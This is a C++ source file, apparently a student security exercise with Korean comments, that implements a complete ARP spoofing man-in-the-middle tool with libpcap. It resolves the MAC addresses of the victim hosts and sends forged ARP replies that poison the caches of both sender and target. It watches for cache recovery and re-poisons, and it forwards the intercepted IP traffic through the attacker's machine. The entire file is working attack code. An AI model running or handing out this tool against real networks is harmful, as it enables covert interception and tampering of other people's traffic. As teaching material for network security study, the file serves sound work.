#include "./lib/network.h"
#include <cstdio>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>

// 코드 흐름
#define PCAP_ERRBUF_SIZE 256

using namespace std;

// get_mac_address, get_ip_address GPT 사용했습니다.
int get_ip_address(const std::string &device, Ip &destIp)
{
    int sock;
    struct ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, device.c_str(), IFNAMSIZ - 1);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl(SIOCGIFADDR)");
        close(sock);
        return -1;
    }

    struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
    destIp = Ip(ntohl(ipaddr->sin_addr.s_addr));
    close(sock);
    return 0;
}

int get_mac_address(const std::string &device, Mac &mac_out)
{
    int sock;
    struct ifreq ifr;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, device.c_str(), IFNAMSIZ - 1);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sock);
        return -1;
    }

    mac_out = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
    close(sock);
    return 0;
}

EthArpPacket makeArpReq(Ip myIp, Mac myMac, Ip targetIp)
{

    EthArpPacket arpReqPacket;
    arpReqPacket.eth_.smac_ = myMac;
    arpReqPacket.eth_.dmac_ = Mac::broadcastMac();
    arpReqPacket.eth_.type_ = htons(EthHdr::Arp);

    arpReqPacket.arp_.hln_ = Mac::Size;
    arpReqPacket.arp_.pln_ = Ip::Size;
    arpReqPacket.arp_.op_ = htons(ArpHdr::Request);
    arpReqPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpReqPacket.arp_.smac_ = myMac;
    arpReqPacket.arp_.sip_ = htonl(uint32_t(myIp));
    arpReqPacket.arp_.tmac_ = Mac::nullMac();
    arpReqPacket.arp_.tip_ = htonl(uint32_t(targetIp));

    return arpReqPacket;
}

EthArpPacket makeArpRes(Ip receiverIp, Mac myMac, Ip targetIp, Mac targetMac)
{

    EthArpPacket arpReqPacket;
    arpReqPacket.eth_.smac_ = myMac;
    arpReqPacket.eth_.dmac_ = targetMac;
    arpReqPacket.eth_.type_ = htons(EthHdr::Arp);

    arpReqPacket.arp_.hln_ = Mac::Size;
    arpReqPacket.arp_.pln_ = Ip::Size;
    arpReqPacket.arp_.op_ = htons(ArpHdr::Reply);
    arpReqPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpReqPacket.arp_.smac_ = myMac;
    arpReqPacket.arp_.sip_ = htonl(uint32_t(receiverIp));
    arpReqPacket.arp_.tmac_ = targetMac;
    arpReqPacket.arp_.tip_ = htonl(uint32_t(targetIp));

    return arpReqPacket;
}

// 이건 내가 작성
Mac getTargetMac(pcap_t *pcap, Ip myIp, Mac myMac, Ip senderIp)
{

    printf("packet make");

    // 패킷 만들기
    EthArpPacket packet = makeArpReq(myIp, myMac, senderIp);

    printf("packet made");

    // 결과를 결과패킷 수신, 파싱
    while (true)
    {
        // 패킷 수신
        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
        if (sendRes != 0)
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
        }

        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        // packet을 구조체로 변환
        const struct EthArpPacket *ethArpPacket = (const struct EthArpPacket *)packet;

        // eth 타입이 ARP ARP 타입이 reply, 출발지, 목적지
        if (ethArpPacket->eth_.type_ != htons(EthHdr::Arp))
            continue;
        if (ethArpPacket->arp_.op_ != htons(ArpHdr::Reply))
            continue;
        if (ethArpPacket->arp_.sip_ != htonl(uint32_t(senderIp)))
            continue;
        if (ethArpPacket->arp_.tip_ != htonl(uint32_t(myIp)))
            continue;

        Mac resultMac = ethArpPacket->arp_.smac_;
        return resultMac;
    }
    return Mac::nullMac();
}

void attack(int pairCnt, Ip *targetIps, Ip *senderIps, Mac myMac, pcap_t *pcap, Mac *senderMacs)
{
    // arp 테이블 공격 - 변조
    for (int i = 0; i < pairCnt; i++)
    {
        EthArpPacket arpRes = makeArpRes(targetIps[i], myMac, senderIps[i], senderMacs[i]);
        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&arpRes), sizeof(EthArpPacket));

        if (sendRes != 0)
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
        }
    }
}

int main(int argc, char *argv[])
{

    // 입력 예외 처리
    if (argc < 4 || (argc - 2) % 2 != 0)
    {
        printf("입력 양식 : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
        return -1;
    }

    char *dev = argv[1];
    printf("argc : %d", argc);
    int pairCnt = (argc - 2) / 2;

    Ip senderIps[pairCnt];
    Ip targetIps[pairCnt];
    Mac senderMacs[pairCnt];
    Mac targetMacs[pairCnt];

    for (int i = 0; i < pairCnt; i++)
    {
        senderIps[i] = Ip(argv[(i * 2 + 2)]);
        targetIps[i] = Ip(argv[(i * 2 + 3)]);
    }

    // 공격자(나) ip
    Ip myIp;
    get_ip_address(dev, myIp);

    printf("my IP : %s\n", std::string(myIp).c_str());

    // 공격자(나) mac
    Mac myMac;
    get_mac_address(dev, myMac);

    printf("my MAC : %s\n", std::string(myMac).c_str());

    // 패킷 캡쳐
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    printf("PairCnt %d :", pairCnt);
    for (int i = 0; i < pairCnt; i++)
    {
        printf("sender=%s, target=%s\n", std::string(senderIps[i]).c_str(), std::string(targetIps[i]).c_str());
        senderMacs[i] = getTargetMac(pcap, myIp, myMac, senderIps[i]);
        targetMacs[i] = getTargetMac(pcap, myIp, myMac, targetIps[i]);
        printf("senderMac : %s\n", std::string(senderMacs[i]).c_str());
    }

    attack(pairCnt, targetIps, senderIps, myMac, pcap, senderMacs);
    attack(pairCnt, senderIps, targetIps, myMac, pcap, targetMacs);

    // 패킷 수신
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        // 감염 풀리는 패킷 탐지
        EthArpPacket *ethArpHdr = (EthArpPacket *)packet;
        for (int i = 0; i < pairCnt; i++) {
            if (ethArpHdr->arp_.op() == htons(ArpHdr::Reply) && ethArpHdr->arp_.tmac() == targetMacs[i]) {

                Ip senderIp = ethArpHdr->arp_.sip();
                Ip targetIp = ethArpHdr->arp_.tip();
                Mac senderMac = ethArpHdr->arp_.smac();

                attack(1, &targetIp, &senderIp, myMac, pcap, &senderMac);
            }
        }

        if (ethArpHdr->arp_.op() == htons(ArpHdr::Request) && ethArpHdr->arp_.tmac() == myMac) {

            Ip senderIp = ethArpHdr->arp_.sip();
            Ip targetIp = ethArpHdr->arp_.tip();
            Mac senderMac = ethArpHdr->arp_.smac();

            attack(1, &targetIp, &senderIp, myMac, pcap, &senderMac);
        }

        if (ethArpHdr->eth_.type() == EthHdr::Ip4)
        {
            for (int i = 0; i < pairCnt; i++)
            {

                // target -> sender
                if (ethArpHdr->eth_.smac() == senderMacs[i] && ethArpHdr->eth_.dmac() == myMac)
                {
                    ethArpHdr->eth_.smac_ = myMac;
                    ethArpHdr->eth_.dmac_ = targetMacs[i];

                    // 읽을 크기만큼 전송
                    int sendRes = pcap_sendpacket(pcap, packet, header->caplen);

                    if (sendRes != 0 && ethArpHdr->eth_.type() == EthHdr::Ip4 && ethArpHdr->arp_.op()) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
                    } else {
                        printf("Packet Fowarded\nSender : %s -> target : %s", std::string(senderIps[i]).c_str(), std::string(targetIps[i]).c_str());
                    }
                }

                // sender -> target
                if (ethArpHdr->eth_.smac() == targetMacs[i] && ethArpHdr->eth_.dmac() == myMac)
                {
                    ethArpHdr->eth_.smac_ = myMac;
                    ethArpHdr->eth_.dmac_ = senderMacs[i];

                    // 읽을 크기만큼 전송
                    int sendRes = pcap_sendpacket(pcap, packet, header->caplen);

                    if (sendRes != 0 && ethArpHdr->eth_.type() == EthHdr::Ip4) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
                    } else {
                        printf("Packet Fowarded\ntTarget : %s -> sender : %s", std::string(targetIps[i]).c_str(), std::string(senderIps[i]).c_str());
                    }
                }
            }
        }

        // 감염 풀리는거 확인 -> 다시 감염시키기~!

    }
    return 0;
}